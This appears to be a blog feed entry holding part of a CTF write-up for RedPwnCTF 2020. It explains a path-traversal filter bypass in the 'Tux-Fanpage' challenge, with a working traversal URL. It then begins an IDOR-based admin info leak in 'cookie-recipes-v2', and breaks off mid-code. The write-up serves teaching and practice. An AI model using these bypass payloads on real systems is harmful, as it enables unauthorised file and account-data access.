            <guid>https://jamvie.net/posts/2020/06/redpwnctf-2020-part-2/</guid>
            <description>Part 2 of my writeup series for RedPwnCTF 2020!
Let&amp;rsquo;s Begin! Tux-Fanpage  points: 464  Ignoring the 1990&amp;rsquo;s aesthetic of the page, observe the provided script:
const express = require(&amp;#39;express&amp;#39;) const path = require(&amp;#39;path&amp;#39;) const app = express() //Don&amp;#39;t forget to redact from published source const flag = &amp;#39;[REDACTED]&amp;#39; app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; { res.redirect(&amp;#39;/page?path=index.html&amp;#39;) }) app.get(&amp;#39;/page&amp;#39;, (req, res) =&amp;gt; { let path = req.query.path //Handle queryless request  if(!</description>
            <content type="html"><![CDATA[<p>Part 2 of my writeup series for RedPwnCTF 2020!</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<h3 id="tux-fanpage">Tux-Fanpage</h3>
<ul>
<li>points: 464</li>
</ul>
<p>Ignoring the 1990&rsquo;s aesthetic of the page, observe the provided script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>)
<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;path&#39;</span>)
<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()

<span style="color:#75715e">//Don&#39;t forget to redact from published source
</span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[REDACTED]&#39;</span>

<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/page?path=index.html&#39;</span>)
})

<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/page&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {

    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">path</span>

    <span style="color:#75715e">//Handle queryless request
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">path</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">strip</span>(<span style="color:#a6e22e">path</span>)){
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/page?path=index.html&#39;</span>)
        <span style="color:#66d9ef">return</span>
    }

    <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">strip</span>(<span style="color:#a6e22e">path</span>)

    <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">preventTraversal</span>(<span style="color:#a6e22e">path</span>)

    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendFile</span>(<span style="color:#a6e22e">prepare</span>(<span style="color:#a6e22e">path</span>), (<span style="color:#a6e22e">err</span>) =&gt; {
        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">headersSent</span>) {
                <span style="color:#66d9ef">try</span> {
                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">strip</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">path</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; not found&#39;</span>)
                } <span style="color:#66d9ef">catch</span> {
                    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>()
                }
            }
        }
    })
})

<span style="color:#75715e">//Prevent directory traversal attack
</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">preventTraversal</span>(<span style="color:#a6e22e">dir</span>){
    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">dir</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;../&#39;</span>)){
        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dir</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;../&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preventTraversal</span>(<span style="color:#a6e22e">res</span>)
    }

    <span style="color:#75715e">//In case people want to test locally on windows
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">dir</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;..\\&#39;</span>)){
        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dir</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;..\\&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preventTraversal</span>(<span style="color:#a6e22e">res</span>)
    }
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">dir</span>
}

<span style="color:#75715e">//Get absolute path from relative path
</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">prepare</span>(<span style="color:#a6e22e">dir</span>){
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">resolve</span>(<span style="color:#e6db74">&#39;./public/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">dir</span>)
}

<span style="color:#75715e">//Strip leading characters
</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">strip</span>(<span style="color:#a6e22e">dir</span>){
    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">regex</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/^[a-z0-9]$/im</span>

    <span style="color:#75715e">//Remove first character if not alphanumeric
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">regex</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">dir</span>[<span style="color:#ae81ff">0</span>])){
        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">dir</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>){
            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strip</span>(<span style="color:#a6e22e">dir</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">1</span>))
        }
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
    }

    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">dir</span>
}

<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; {
    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;listening on 0.0.0.0:3000&#39;</span>)
})

</code></pre></div><p>From this, the functions <code>Strip()</code> and <code>preventTraversal()</code> are important:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">//Prevent directory traversal attack
</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">preventTraversal</span>(<span style="color:#a6e22e">dir</span>){
    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">dir</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;../&#39;</span>)){
        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dir</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;../&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preventTraversal</span>(<span style="color:#a6e22e">res</span>)
    }

    <span style="color:#75715e">//In case people want to test locally on windows
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">dir</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;..\\&#39;</span>)){
        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dir</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;..\\&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preventTraversal</span>(<span style="color:#a6e22e">res</span>)
    }
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">dir</span>
}

<span style="color:#75715e">//Strip leading characters
</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">strip</span>(<span style="color:#a6e22e">dir</span>){
    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">regex</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/^[a-z0-9]$/im</span>

    <span style="color:#75715e">//Remove first character if not alphanumeric
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">regex</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">dir</span>[<span style="color:#ae81ff">0</span>])){
        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">dir</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>){
            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strip</span>(<span style="color:#a6e22e">dir</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">1</span>))
        }
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
    }

    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">dir</span>
}

</code></pre></div><p>This gives away the attack for this challenge: a directory traversal attack. We would try to force access into folders/directories typically inaccessible from the webpage&rsquo;s root folder. Specifically, the provided script were given hints us to try and traverse our way onto the server&rsquo;s version of <code>index.js</code>, which likely has the flag that isn&rsquo;t redacted (&ldquo;Dont forget to redact from published source&rdquo;). We want to use a URL like</p>
<pre><code>https://tux-fanpage.2020.redpwnc.tf/page?path=../
</code></pre><p>Individually, the above functions can be bypassed:</p>
<ul>
<li>for <code>strip()</code>, it simply checks if the first character of the argument is alphanumeric, and removes that char if it isn&rsquo;t. In the get request to <code>/page</code>, it calls <code>strip()</code> first. Therefore, we can bypass that check if our URL
looks like</li>
</ul>
<pre><code>https://tux-fanpage.2020.redpwnc.tf/page?path=j&amp;path=../
</code></pre><ul>
<li>for <code>preventTraversal()</code>, the function will recursively check for and remove any instance of <code>../</code> in our input. However, the input in this case, dir, is set as an array. Using the <code>includes()</code> function on an array will return true only if an element of that array exactly matches whatever <code>includes()</code> is comparing it too. So, the function will allow <code>../blah</code> to pass through, as it doesn&rsquo;t exactly match <code>../</code>. We can bypass this check if our url looks like</li>
</ul>
<pre><code>https://tux-fanpage.2020.redpwnc.tf/page?path=j&amp;path=../blah
</code></pre><p>It was mentioned in my <a href="/post/05de1ctf2020_01/">DE1CTF writeup</a> of &ldquo;Hard_Pentest_1&rdquo; that javascript shares PHP&rsquo;s ability to combine arrays (of certain types) and strings together. To this end, consider the following example:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">myStr</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hello&#34;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">array</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;World&#34;</span>, <span style="color:#e6db74">&#34;!&#34;</span>];


<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">myStr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">array</span>;

<span style="color:#a6e22e">print</span> <span style="color:#a6e22e">res</span>;

<span style="color:#f92672">----------</span>

<span style="color:#e6db74">&#34;hello, , World, !&#34;</span>
</code></pre></div><p>Javascript will concatenate the elements of the array to the provided string. Observe, then, how the tux-fanpage script does this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">//Get absolute path from relative path
</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">prepare</span>(<span style="color:#a6e22e">dir</span>){
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">resolve</span>(<span style="color:#e6db74">&#39;./public/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">dir</span>)
}
</code></pre></div><p>In this case the string is <code>'./public/'</code> and the array is <code>dir</code>. Keeping in mind the ways to bypass the two filter functions above, our directory traversing URL will look like</p>
<pre><code>https://tux-fanpage.2020.redpwnc.tf/page?path=j&amp;path=../../../index.js
</code></pre><p>Going to this URL will take us to the published source&rsquo;s javascript file where the flag is found.</p>

    <img src="/images/REDPWN2020_TuxFlag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<h3 id="cookie-recipes-v2">cookie-recipes-v2</h3>
<ul>
<li>points: 488</li>
</ul>
<p>The exploit here is slightly complicated. To summarize, we will need to do a CSRF attack, but theres alot more to this challenge than what I originally thought.</p>
<p>The site will ask us to register, and then we will come to the landing page where we can buy 3 recipes. The last one is the flag for this challenge, which costs 1000 credits - currently we only have 100. Additionally, there exists a &ldquo;RECIPE&rdquo; submission bar where you send a URL of a recipe to the admin for them to review.</p>
<p>Several exploits come to mind:</p>
<ol>
<li>The ability to send a URL to admin allows the possibility to perform XSS or CSRF attacks. Hopefully, being admin will have special privileges that allow us to obtain the flag.</li>
<li>The main thing barring us from obtaining the flag is the lack of credits we have. If we could find a way to add more credits to our account, we could purchase the flag.</li>
</ol>
<p>The challenge is accompanied by their source script. While long, several things are of note:</p>
<p>In the last few lines of the source, we see that the ID of the admin is 0.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// Add admin account if it does not exist yet
</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">hasUser</span>(<span style="color:#e6db74">&#39;admin&#39;</span>)) {
    <span style="color:#75715e">// Admin gets id 0
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">register</span>(<span style="color:#e6db74">&#39;admin&#39;</span>, <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">ADMIN_PASS</span>, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">ADMIN_TOKEN</span>);
    <span style="color:#a6e22e">statements</span>.<span style="color:#a6e22e">setIp</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#39;::1&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
}
</code></pre></div><p>Additionally, we see a list of SQL statements.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">statements</span> <span style="color:#f92672">=</span> {
    <span style="color:#a6e22e">resetUsers</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;DROP TABLE IF EXISTS users;&#39;</span>),
    <span style="color:#a6e22e">fromUsername</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;SELECT * FROM users WHERE username = ?;&#39;</span>),
    <span style="color:#a6e22e">fromId</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;SELECT * FROM users WHERE id = ?;&#39;</span>),
    <span style="color:#a6e22e">fromToken</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;SELECT user_id FROM tokens WHERE token = ?;&#39;</span>),
    <span style="color:#a6e22e">isAdmin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;SELECT admin FROM users WHERE id = ?;&#39;</span>),
    <span style="color:#a6e22e">register</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">`INSERT INTO 
</span><span style="color:#e6db74">        users (id, username, password, balance, received_gift, admin) 
</span><span style="color:#e6db74">        VALUES (?, ?, ?, ?, ?, ?);`</span>),
    <span style="color:#a6e22e">addToken</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">`INSERT INTO
</span><span style="color:#e6db74">        tokens (token, user_id)
</span><span style="color:#e6db74">        VALUES (?, ?);`</span>),
    <span style="color:#a6e22e">getToken</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;SELECT token FROM tokens WHERE user_id = ?;&#39;</span>),
    <span style="color:#a6e22e">login</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;SELECT id FROM users WHERE username = ? AND password = ?;&#39;</span>),
    <span style="color:#a6e22e">setBalance</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;UPDATE users SET balance = ? WHERE id = ?&#39;</span>),
    <span style="color:#a6e22e">purchaseRecipe</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">`INSERT INTO
</span><span style="color:#e6db74">        purchases (user_id, recipe_id)
</span><span style="color:#e6db74">        VALUES (?, ?);`</span>),
    <span style="color:#a6e22e">ownsRecipe</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;SELECT * FROM purchases WHERE user_id = ? AND recipe_id = ?;&#39;</span>),
    <span style="color:#a6e22e">getPurchases</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;SELECT * FROM purchases WHERE user_id = ?;&#39;</span>),
    <span style="color:#a6e22e">receivedGift</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;SELECT received_gift FROM users WHERE id = ?;&#39;</span>),
    <span style="color:#a6e22e">checkPassword</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;SELECT * FROM users WHERE id = ? AND password = ?;&#39;</span>),
    <span style="color:#a6e22e">setReceived</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;UPDATE users SET received_gift = 1 WHERE id = ?;&#39;</span>),
    <span style="color:#a6e22e">allowedIp</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;SELECT allowed_ip FROM users WHERE username = ?;&#39;</span>),
    <span style="color:#a6e22e">setIp</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;UPDATE users SET allowed_ip = ? WHERE id = ?;&#39;</span>)
};
</code></pre></div><p>From the first snippet of code above, we know that admin&rsquo;s username is <code>admin</code> and their id is 0. If we can somehow call the methods that subsequently call these statements, we could retrieve the credentials of the admin. As tokens are generated unique to the user, we won&rsquo;t be able to spoof as admin without their cookie token, and so we need to find a way to get the admin info that doesn&rsquo;t rely on using the cookie-generated token.  To this end, <code>fromId</code> is attractive, as it requires just the id of the user.</p>
<p>I am utilizing burp&rsquo;s proxy service. I register an account as usual, and notice the api call to <code>/userInfo</code>, which, according to the javascript source, will deliver the info of a specific user based on their ID - likely preparing the <code>fromId</code> SQL statement.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">[<span style="color:#e6db74">&#39;userInfo&#39;</span>, <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> {
            <span style="color:#e6db74">&#39;success&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>
        };
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">method</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;GET&#39;</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">405</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#75715e">// Get target user id from url params
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">parseParams</span>(<span style="color:#a6e22e">req</span>).<span style="color:#a6e22e">id</span>;
        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">id</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">400</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#75715e">// Get info from database
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">info</span>;
        <span style="color:#66d9ef">try</span> {
            <span style="color:#a6e22e">info</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">getInfo</span>(<span style="color:#a6e22e">id</span>);
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">info</span>) {
            <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ID not found&#39;</span>; 
            <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">404</span>, <span style="color:#a6e22e">result</span>);
            <span style="color:#66d9ef">return</span>;
        }
        <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">success</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
        <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">info</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">info</span>;
        <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">200</span>, <span style="color:#a6e22e">result</span>);
    }]
</code></pre></div><p>Knowing that the admin&rsquo;s ID is 0, modify the api call request to <code>/userInfo</code> to get the info of the admin&rsquo;s account, not our own.</p>

    <img src="/images/REDPWN2020_CookieUserInfo.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Our edited request succesfully grabs the info of the admin account.</p>

    <img src="/images/REDPWN2020_CookieAdmin.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>However, it is shown that the admin account also doesn&rsquo;t have enough credits, and they haven&rsquo;t purchased it before so its not in their account. Additionally, you can&rsquo;t login as it also checks the ip of the session - but this can be bypassed by converting our request into JSON, as they parse xml requests and bypass checks if not in xml. Despite that, it appears as though this is a dead end - so let&rsquo;s consider our other avenue of attack: adding more credits to our account.</p>
<p>Another function of importance is the API call to <code>/gift</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">[<span style="color:#e6db74">&#39;gift&#39;</span>, <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">method</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">405</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }
        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> {
            <span style="color:#e6db74">&#39;success&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>
        };

        <span style="color:#75715e">// Get token from cookie
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">parseCookies</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>.<span style="color:#a6e22e">cookie</span>);
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">has</span>(<span style="color:#e6db74">&#39;token&#39;</span>)) {
            <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">200</span>, <span style="color:#a6e22e">result</span>);
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;token&#39;</span>);
        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span>(<span style="color:#a6e22e">token</span>) <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
            <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Invalid token&#39;</span>;
            <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">401</span>, <span style="color:#a6e22e">result</span>);
            <span style="color:#66d9ef">return</span>;
        }


        <span style="color:#75715e">// Get id from token
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">id</span>;
        <span style="color:#66d9ef">try</span> {
            <span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">getId</span>(<span style="color:#a6e22e">token</span>);
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
